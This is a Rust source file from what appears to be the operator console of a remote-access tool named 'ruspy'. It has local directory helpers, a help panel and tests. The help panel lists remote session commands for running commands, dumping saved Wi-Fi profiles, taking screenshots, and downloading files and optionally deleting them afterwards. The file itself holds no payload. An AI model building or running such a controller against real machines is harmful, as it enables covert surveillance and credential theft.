use crate::constants::{BOLD, CYAN, DIM, GREEN, RED, RESET, WHITE, YELLOW};

use std::io::Write;
use std::{env, path::Path};
use std::{fs, io};

pub fn local_cd(instruct: &[&str]) -> Result<bool, String> {
    // Remove lcd from instruct
    let path = match instruct.get(1) {
        Some(p) => p,
        None => {
            println!(
                "\n\t{DIM}[{RESET}{RED}err:lcd{RESET}{DIM}]{RESET} {YELLOW}Missing path:{RESET} {WHITE}{}{RESET}\n",
                instruct.join(" ")
            );
            return Ok(true);
        }
    };

    // Check if path is correct
    if !Path::new(path).exists() {
        println!(
            "\n\t{DIM}[{RESET}{RED}err:lcd{RESET}{DIM}]{RESET} {YELLOW}Path dont exist:{RESET} {WHITE}{}{RESET}\n",
            path
        );
        return Ok(true);
    }

    // Change directory
    Ok(env::set_current_dir(path).is_ok())
}

pub fn local_list() -> Result<bool, String> {
    let current_dir = env::current_dir().map_err(|e| e.to_string())?;
    let entries = fs::read_dir(current_dir.clone()).map_err(|e| e.to_string())?;

    println!(
        "\n\t{DIM}[{RESET}{WHITE}ls:{RESET}{DIM}]{RESET} {CYAN}{}{RESET}\n",
        current_dir.display()
    );

    for entry in entries {
        let entry = entry.map_err(|e| e.to_string())?;
        let metadata = entry.metadata().map_err(|e| e.to_string())?;
        let name = entry.file_name().to_string_lossy().to_string();

        if metadata.is_dir() {
            println!("\t\t{}[DIR]{} {}{}{}", YELLOW, RESET, CYAN, name, RESET);
        } else {
            println!("\t\t      {}{}{}", WHITE, name, RESET);
        }
    }

    println!();
    Ok(true)
}

pub fn local_pwd() -> Result<bool, String> {
    let current_path = env::current_dir().map_err(|e| e.to_string())?;
    println!(
        "\n\t{DIM}[{RESET}{WHITE}cwd:{RESET}{DIM}]{RESET} {CYAN}{}{RESET}\n",
        current_path.display()
    );
    Ok(true)
}

pub fn clear_console() -> Result<bool, String> {
    print!("\x1B[2J\x1B[1;1H");
    io::stdout().flush().expect("Cannot flush output");
    Ok(true)
}

pub fn build_help_panel() -> String {
    let mut panel = String::new();

    panel.push_str(&format!(
        "\n\t{DIM}[{RESET}{GREEN}help{RESET}{DIM}]{RESET} {WHITE}ruspy command panel{RESET}\n\n"
    ));

    panel.push_str(&format!(
        "\t{DIM}[{RESET}{WHITE}Manager commands{RESET}{DIM}]{RESET}\n"
    ));
    panel.push_str(&help_row("sessions", "List active client sessions."));
    panel.push_str(&help_row("session <id>", "Attach to a client session."));
    panel.push_str(&help_row("lcd <path>", "Change local server directory."));
    panel.push_str(&help_row(
        "lls",
        "List files in the local server directory.",
    ));
    panel.push_str(&help_row("lpwd", "Print the local server directory."));
    panel.push_str(&help_row("clear", "Clear the console."));
    panel.push_str(&help_row("help", "Show this help panel."));
    panel.push_str(&help_row("q | exit", "Exit the server prompt."));

    panel.push_str(&format!(
        "\n\t{DIM}[{RESET}{WHITE}Session commands{RESET}{DIM}]{RESET}\n"
    ));
    panel.push_str(&help_row(
        "sysinfo",
        "Show OS, hardware, memory, disk, and process info.",
    ));
    panel.push_str(&help_row(
        "check",
        "Check if the client has admin privileges.",
    ));
    panel.push_str(&help_row(
        "display -t \"Title\" -c \"Content\" -l info",
        "Show a message box on the client.",
    ));
    panel.push_str(&help_row(
        "exec <command>",
        "Execute a single command (or onliners!).",
    ));
    panel.push_str(&help_row(
        "wifidump",
        "Dump all wifi profiles saved on the remote device.",
    ));
    panel.push_str(&help_row(
        "screenshot",
        "Capture the primary monitor and download it automatically.",
    ));
    panel.push_str(&help_row(
        "download -f \"C:\\path\\file.txt\" [-r]",
        "Download a file from the client. -r removes it after transfer.",
    ));
    panel.push_str(&help_row(
        "upload <local_path>",
        "Upload a local server file to the client.",
    ));
    panel.push_str(&help_row("close", "Close the active client connection."));
    panel.push_str(&help_row("q | exit", "Return to the manager prompt."));

    panel.push_str(&format!(
        "\n\t{DIM}[{RESET}{WHITE}Flags{RESET}{DIM}]{RESET}\n"
    ));
    panel.push_str(&help_row("-f <path>", "Remote file path used by download."));
    panel.push_str(&help_row("-t <title>", "Display box title."));
    panel.push_str(&help_row("-c <content>", "Display box content."));
    panel.push_str(&help_row(
        "-l <level>",
        "Display level: info | warning | error.",
    ));

    panel.push_str(&format!(
        "\n\t{DIM}Tip:{RESET} {YELLOW}Use quotes when paths or text contain spaces.{RESET}\n\n"
    ));

    panel
}

fn help_row(command: &str, description: &str) -> String {
    format!(
        "\t\t{BOLD}{CYAN}{:<42}{RESET} {DIM}-{} {WHITE}{}{RESET}\n",
        command, RESET, description
    )
}

pub fn help_panel() -> Result<bool, String> {
    print!("{}", build_help_panel());
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::build_help_panel;

    #[test]
    fn help_panel_documents_manager_and_session_commands() {
        let help = build_help_panel();

        assert!(help.contains("Manager commands"));
        assert!(help.contains("sessions"));
        assert!(help.contains("session <id>"));
        assert!(help.contains("Session commands"));
        assert!(help.contains("sysinfo"));
        assert!(help.contains("close"));
    }

    #[test]
    fn help_panel_documents_flagged_command_usage() {
        let help = build_help_panel();

        assert!(help.contains("download -f \"C:\\\\path\\\\file.txt\""));
        assert!(help.contains("display -t \"Title\" -c \"Content\" -l info"));
        assert!(help.contains("info | warning | error"));
    }
}
